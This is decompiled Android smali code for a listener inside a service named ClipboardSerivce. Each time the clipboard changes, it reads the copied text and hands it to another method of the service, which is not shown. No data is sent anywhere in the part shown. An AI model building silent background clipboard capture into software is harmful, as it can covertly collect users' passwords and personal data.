.class final Lcom/app/service/ClipboardSerivce$1;
.super Ljava/lang/Object;
.source "ClipboardSerivce.java"

# interfaces
.implements Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/app/service/ClipboardSerivce;->onStartCommand(Landroid/content/Intent;II)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private synthetic a:Lcom/app/service/ClipboardSerivce;


# direct methods
.method constructor <init>(Lcom/app/service/ClipboardSerivce;)V
    .locals 0

    .line 44
    iput-object p1, p0, Lcom/app/service/ClipboardSerivce$1;->a:Lcom/app/service/ClipboardSerivce;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final onPrimaryClipChanged()V
    .locals 2

    .line 47
    :try_start_0
    iget-object v0, p0, Lcom/app/service/ClipboardSerivce$1;->a:Lcom/app/service/ClipboardSerivce;

    invoke-static {v0}, Lcom/app/service/ClipboardSerivce;->a(Lcom/app/service/ClipboardSerivce;)Landroid/content/ClipboardManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    move-result-object v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/app/service/ClipboardSerivce$1;->a:Lcom/app/service/ClipboardSerivce;

    invoke-static {v0}, Lcom/app/service/ClipboardSerivce;->a(Lcom/app/service/ClipboardSerivce;)Landroid/content/ClipboardManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/ClipData;->getItemCount()I

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/app/service/ClipboardSerivce$1;->a:Lcom/app/service/ClipboardSerivce;

    .line 48
    invoke-static {v0}, Lcom/app/service/ClipboardSerivce;->a(Lcom/app/service/ClipboardSerivce;)Landroid/content/ClipboardManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/content/ClipData;->getItemAt(I)Landroid/content/ClipData$Item;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/ClipData$Item;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 49
    iget-object v0, p0, Lcom/app/service/ClipboardSerivce$1;->a:Lcom/app/service/ClipboardSerivce;

    invoke-static {v0}, Lcom/app/service/ClipboardSerivce;->a(Lcom/app/service/ClipboardSerivce;)Landroid/content/ClipboardManager;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/content/ClipData;->getItemAt(I)Landroid/content/ClipData$Item;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/ClipData$Item;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    .line 50
    iget-object v1, p0, Lcom/app/service/ClipboardSerivce$1;->a:Lcom/app/service/ClipboardSerivce;

    invoke-static {v1, v0}, Lcom/app/service/ClipboardSerivce;->a(Lcom/app/service/ClipboardSerivce;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return-void

    :catch_0
    move-exception v0

    .line 53
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    return-void
.end method
